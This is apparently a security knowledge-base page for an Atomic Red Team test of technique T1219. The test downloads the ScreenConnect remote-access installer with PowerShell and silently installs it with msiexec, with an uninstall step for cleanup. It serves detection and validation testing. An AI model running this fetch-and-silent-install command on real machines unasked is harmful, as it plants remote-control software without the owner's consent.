---
atomic_guid: "4a18cc4e-416f-4966-9a9d-75731c4684c0"
title: "ScreenConnect Application Download and Install on Windows"
framework: "atomic"
generated: "true"
attack_technique_id: "T1219"
attack_technique_name: "Remote Access Software"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1219/T1219.yaml"
build_date: "2026-04-26 17:02:12"
executor: "powershell"
aliases:
  - "4a18cc4e-416f-4966-9a9d-75731c4684c0"
  - "ScreenConnect Application Download and Install on Windows"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# ScreenConnect Application Download and Install on Windows

An adversary may attempt to trick the user into downloading ScreenConnect for use as a C2 channel. Download of ScreenConnect installer will be in the Downloads directory.
Msiexec will be used to quietly insall ScreenConnect.

## Metadata

- Atomic GUID: 4a18cc4e-416f-4966-9a9d-75731c4684c0
- Technique: T1219: Remote Access Software
- Platforms: windows
- Executor: powershell
- Elevation Required: True
- Source Path: atomics/T1219/T1219.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1219-remote_access_tools|T1219]]

## Executor

- elevation_required: True
- name: powershell

### Command

```powershell
$installer = "C:\Users\$env:username\Downloads\ScreenConnect.msi"
Invoke-WebRequest -OutFile $installer "https://d1kuyuqowve5id.cloudfront.net/ScreenConnect_25.1.10.9197_Release.msi"
msiexec /i $installer /qn
```

### Cleanup

```powershell
$installer = "C:\Users\$env:username\Downloads\ScreenConnect.msi"
msiexec /x $installer /qn
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1219/T1219.yaml)
